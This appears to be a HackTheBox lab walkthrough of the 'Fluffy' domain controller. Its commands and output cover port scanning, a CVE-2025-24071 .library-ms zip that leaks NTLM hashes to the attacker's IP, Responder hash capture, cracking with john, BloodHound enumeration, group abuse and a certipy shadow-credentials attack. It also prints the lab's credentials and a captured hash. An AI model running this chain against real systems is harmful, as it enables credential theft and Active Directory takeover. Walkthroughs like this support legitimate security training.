![[Fluffy-01.png]]
### Network Scan
Lets start our scan with the target ip using rustscan:
```bash
rustscan -a 10.10.11.69 -- -sV
```

##### Output
```bash
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.11.69:139
Open 10.10.11.69:88
Open 10.10.11.69:389
Open 10.10.11.69:445
Open 10.10.11.69:464
Open 10.10.11.69:593
Open 10.10.11.69:636
Open 10.10.11.69:53
Open 10.10.11.69:9389
Open 10.10.11.69:49667
Open 10.10.11.69:49688
Open 10.10.11.69:49689
Open 10.10.11.69:49691
Open 10.10.11.69:49707
Open 10.10.11.69:49713
Open 10.10.11.69:49746
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sV" on ip 10.10.11.69
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-30 20:09 UTC
NSE: Loaded 47 scripts for scanning.
Initiating Ping Scan at 20:09
Scanning 10.10.11.69 [4 ports]
Completed Ping Scan at 20:09, 0.18s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:09
Completed Parallel DNS resolution of 1 host. at 20:09, 0.11s elapsed
DNS resolution of 1 IPs took 0.11s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 20:09
Scanning 10.10.11.69 [16 ports]
Discovered open port 139/tcp on 10.10.11.69
Discovered open port 49689/tcp on 10.10.11.69
Discovered open port 53/tcp on 10.10.11.69
Discovered open port 445/tcp on 10.10.11.69
Discovered open port 49707/tcp on 10.10.11.69
Discovered open port 593/tcp on 10.10.11.69
Discovered open port 88/tcp on 10.10.11.69
Discovered open port 49667/tcp on 10.10.11.69
Discovered open port 9389/tcp on 10.10.11.69
Discovered open port 49746/tcp on 10.10.11.69
Discovered open port 636/tcp on 10.10.11.69
Discovered open port 389/tcp on 10.10.11.69
Discovered open port 464/tcp on 10.10.11.69
Discovered open port 49688/tcp on 10.10.11.69
Discovered open port 49691/tcp on 10.10.11.69
Discovered open port 49713/tcp on 10.10.11.69
Completed SYN Stealth Scan at 20:09, 0.30s elapsed (16 total ports)
Initiating Service scan at 20:09
Scanning 16 services on 10.10.11.69
Completed Service scan at 20:10, 60.09s elapsed (16 services on 1 host)
NSE: Script scanning 10.10.11.69.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 20:10
Completed NSE at 20:10, 0.01s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 20:10
Completed NSE at 20:10, 0.24s elapsed
Nmap scan report for 10.10.11.69
Host is up, received echo-reply ttl 126 (0.13s latency).
Scanned at 2025-06-30 20:09:50 UTC for 60s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-06-30 20:09:57Z)
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49688/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49707/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49713/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49746/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.16 seconds
           Raw packets sent: 20 (856B) | Rcvd: 17 (732B)

```

We can see few things here worth noting as:
```bash
Domain: fluffy.htb
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```
The host is a domain controller of the domain fluffy.htb so lets add that to /etc/hosts file
```bash
sudo echo "10.10.11.69 fluffy.htb DC01.fluffy.htb" >> /etc/hosts
```

Check using 
```bash
cat /etc/hosts

#Output

127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.18.0.2	kali
10.10.11.69 fluffy.htb DC01.fluffy.htb

```

Also you can do ping for domain resolution
```bash
PING fluffy.htb (10.10.11.69) 56(84) bytes of data.
64 bytes from fluffy.htb (10.10.11.69): icmp_seq=1 ttl=126 time=184 ms
64 bytes from fluffy.htb (10.10.11.69): icmp_seq=2 ttl=126 time=102 ms
64 bytes from fluffy.htb (10.10.11.69): icmp_seq=3 ttl=126 time=120 ms
64 bytes from fluffy.htb (10.10.11.69): icmp_seq=4 ttl=126 time=97.1 ms
64 bytes from fluffy.htb (10.10.11.69): icmp_seq=5 ttl=126 time=164 ms
64 bytes from fluffy.htb (10.10.11.69): icmp_seq=6 ttl=126 time=187 ms
^C
--- fluffy.htb ping statistics ---
6 packets transmitted, 6 received, 0% packet loss, time 5007ms
rtt min/avg/max/mdev = 97.064/142.441/186.935/37.249 ms

```

### Recon
We see that the smb ports are open lets try to list the smb shares on the victim
```bash
smbclient -L \\fluffy.htb
```

##### Output
```bash
smbclient -L \\fluffy.htb
Password for [WORKGROUP\root]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	IT              Disk      
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
```
We can see an unusual `Share` called `IT` but while accessing it it says 
```bash
smbclient //fluffy.htb/IT
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> 
```

Now lets go back to the HackTheBox page and check the creds given in the room
Username:
```bash
j.fleischman
```
Password:
```bash
J0elTHEM4n1990
```
Lets use the above to check if we can list the shares
```bash
smbclient //fluffy.htb/IT -U fluffy.htb/j.fleischman%J0elTHEM4n1990!
```


#### SMB listings
Now we get the access and everything looks okayish except the Upgrade_notice.pdf and Malicious.library-ms
```bash
smb: \> ls
  .                                   D        0  Mon Jun 30 18:31:07 2025
  ..                                  D        0  Mon Jun 30 18:31:07 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 15:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 15:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 15:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 15:03:17 2025
  malicious.library-ms                A      366  Mon Jun 30 18:30:45 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 14:31:07 2025

		5842943 blocks of size 4096. 2253598 blocks available
```

Lets download the pdf first and see its content
![[Fluffy-02.png]]
In this page it literally tells us that system has these vulnerabilities and it should be patched

#### Looking At CVE-2025-24071
Okay so researching it i arrived at this github repo:
```http
https://github.com/ThemeHackers/CVE-2025-24071
```
In this the Overview was quite amusing:
```Markdown
NSFOCUS CERT has detected that Microsoft recently released a security update to address a critical spoofing vulnerability in Windows File Explorer, identified as **CVE-2025-24071**. This vulnerability has a CVSS score of 7.5, indicating its severity. The issue arises from the implicit trust and automatic file parsing behavior of `.library-ms` files in Windows Explorer. An unauthenticated attacker can exploit this vulnerability by constructing RAR/ZIP files containing a malicious SMB path. Upon decompression, this triggers an SMB authentication request, potentially exposing the user's NTLM hash. PoC (Proof of Concept) exploits for this vulnerability are now publicly available, making it a current threat. Affected users are strongly advised to apply the patch immediately to mitigate the risk.
```
It says that this vulnerability is of windows explorer that is using `implicit trust and automatic file parsing` means that if we upload the zip to the server and unzip it, it will automatically execute it lets try that.

### Exploitation
 #### Initial Foothold
```bash
git clone https://github.com/ThemeHackers/CVE-2025-24071
cd CVE-2025-24071
```

Now lets craft the exploit.zip file
```bash
python3 exploit.py -f malicious -i $tun0
```
Explaination
-f : name of the library without extension we can see that in [[#SMB listings|Here]]
-i : our hackthebox vpn ip or tun0 ip 


Now lets start our responder on tun0 or whatever your HTB vpn interface is.
```bash
sudo python3 Responder.py -I tun0 
```

and then upload the exploit.zip file to the victim via smb
```bash
smb: \> put exploit.zip
# output: putting file exploit.zip as \exploit.zip (0.9 kb/s) (average 0.9 kb/s)
```

The output of Responder
```bash
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

[*] Sponsor Responder: https://paypal.me/PythonResponder

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.71]
    Responder IPv6             [dead:beef:2::1045]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-I81RVRMIPAF]
    Responder Domain Name      [DEDN.LOCAL]
    Responder DCE-RPC Port     [47155]

[*] Version: Responder 3.1.6.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...

[!] Error starting TCP server on port 80, check permissions or other servers running.
[!] Error starting TCP server on port 25, check permissions or other servers running.
[!] Error starting TCP server on port 53, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:f5f53c91ba63b18d:271154115FA86050FAEEF808A8BD80CE:010100000000000000C529CA06EADB01E301D5EBC93708F500000000020008004400450044004E0001001E00570049004E002D004900380031005200560052004D00490050004100460004003400570049004E002D004900380031005200560052004D0049005000410046002E004400450044004E002E004C004F00430041004C00030014004400450044004E002E004C004F00430041004C00050014004400450044004E002E004C004F00430041004C000700080000C529CA06EADB010600040002000000080030003000000000000000010000000020000098BFC77C0C6787ABF3570F320C9520487288FC2FE9DFF6A6020A44164658AEA70A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370031000000000000000000
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila

```

We got the hash of the user p.agila lets save this in a file and crack this using john
```bash
john p.agila.hash --wordlist=/usr/share/wordlists/rockyou.txt 
```

Output:
```bash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
prometheusx-303  (p.agila)     
1g 0:00:00:01 DONE (2025-06-30 21:54) 0.9433g/s 4266Kp/s 4266Kc/s 4266KC/s prrm30w..prison only
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 

```

And we got the password for the user p.agila
```Copy
prometheusx-303
```


#### Bloodhound
Even after getting the user and pass we cant get a working shell but what we can do now is collect the data about the AD environment using any bloodhound ingestor , here i am using nxc but you can use anything you like just make sure it is compatible with your bloodhound
```bash
nxc ldap fluffy.htb -u p.agila -p prometheusx-303 --bloodhound --collection All --dns-server 10.10.11.69
```
	nxc : the netexec tool we are using 
	fluffy.htb : our victim domain we can also use the ip
	-u : username
	-p : password
	 --bloodhound : for the ingester json type
	 --collection : all for collecting all info
	 
 The Output
```bash
 LDAP        10.10.11.69     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:None) (channel binding:Never) 
LDAP        10.10.11.69     389    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
LDAP        10.10.11.69     389    DC01             Resolved collection methods: localadmin, container, trusts, acl, dcom, session, group, psremote, objectprops, rdp
[22:26:15] ERROR    Unhandled exception in computer DC01.fluffy.htb processing: The NETBIOS connection with the remote host timed out.                                        computers.py:268
LDAP        10.10.11.69     389    DC01             Done in 0M 19S
LDAP        10.10.11.69     389    DC01             Compressing output into /home/dork/.nxc/logs/DC01_10.10.11.69_2025-06-30_222556_bloodhound.zip

```
You can copy the bloodhound.zip file to your desired location and then upload it to bloodhound.

![[Fluffy-03.png]]
Click on Upload Files and select the bloodhound.zip file 
![[Fluffy-04.png]]
It will take some time roughly a min (depends on your system) to ingest the file

Now in bloodhound you can see the user p.agila on explore page --> search nodes --> p.agila --> enter 
![[Fluffy-05.png]]
Click on the Profile icon and on the right side you can see the details about the user

Scroll down and click on Outbound Object Control you will see something like this

![[Fluffy-06.png]]
Now that we know P.AGILA is a member of Service Account Managers which generic all permission on Service Accounts we can list all the service account by clicking on Service Accounts.
![[Fluffy-07.png]]
Now we have 3 Users 
	1. CA_SVC
	2. LDAP_SVC
	3. WINRM_SVC
#### PATH-TO-SERVICE Account using P.AGILA
We can utilize the pathfinding tab in bloodhound explore page for getting the path to any service account.
![[Fluffy-08.png]]
Here we can see that P.AGILA is a member of Service Accounts Managers which has Generic all on Service Accounts which has GenericWrite on WINRM_SVC
Similarly if we pathfind from P.AGILA --> LDAP/CA_SVC we can see the same.

So lets first add p.agila to the Service Accounts group, click on the Generic All after Service Account Manager on bloodhound and on the right side you will be able to see this.

```bash
net rpc group members "Service Accounts" "p.agila" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S "DC01.fluffy.htb"
```
#### Shadow Credential Attack [Reference](https://www.hackingarticles.in/shadow-credentials-attack/)
This attack leverages the mismanagement or exploitation of Active Directory Certificate Services (AD CS) to inject custom certificates into a user account, granting attackers persistent access. As a result of modifying the msDS-KeyCredentialLink attribute, adversaries can effectively create “shadow credentials” that allow them to authenticate as the target user without needing their password or NTLM hash.

The attacker identifies an Active Directory object (such as a user or computer account) where they have permissions to modify attributes. Permissions like **GenericWrite** or **GenericAll** are required to modify the **msDS-KeyCredentialLink** attribute.

Since we have it all checked out lets start with the attack

#### SCA

There are many tools out there through which we can perform this attack like pywhisker bloody-AD etc but i chose to go with certipy-ad since it automate the lengthy process and can be resolved in single command.
Certipy’s shadow command has an auto action, which will add a new Key Credential to the target account, authenticate with the Key Credential to retrieve the NT hash and a TGT for the target, and finally restore the old Key Credential attribute.
But make sure to check out the pywhisker method as it explains the whole thing in a way better manner.
	 Required Tools:  Impacket, certipy-ad 
```bash
certipy-ad shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc 
```
